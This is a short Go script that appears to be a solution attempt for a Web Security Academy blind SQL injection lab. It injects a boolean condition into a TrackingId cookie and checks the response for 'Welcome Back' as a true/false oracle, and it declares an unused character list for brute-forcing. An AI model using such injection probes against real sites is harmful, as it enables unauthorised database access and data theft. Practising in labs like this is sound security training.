package main

import (
	"io/ioutil"
	"log"
	"net/http"
	"strings"
)

var Characters = []string{
	"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "_", "", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "@", ".",
}

func sqli(url string) {
	//proxyStr := "http://127.0.0.1:8080"
	//proxyURL, err := url.Parse(proxyStr)

	//transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}

	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	req.Header.Set("Cookies", "TrackingId=v4h1hnrYcYnXHRhO'AND+'1'='1; session=vrNksoT201uTwzpmjPVyLzPA9hRpf2C3")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	log.Println(string(body))
	if err != nil {
		log.Fatalln(err)
	}

	//Detect error message in response body
	respBody := string(body)
	if strings.Contains(respBody, "Welcome Back") {
		log.Println("True")
	} else {
		log.Println("False")
	}
}

func main() {

	sqli("https://ac251f611eef4dc1c06524bf001000ff.web-security-academy.net/product?productId=4")

}
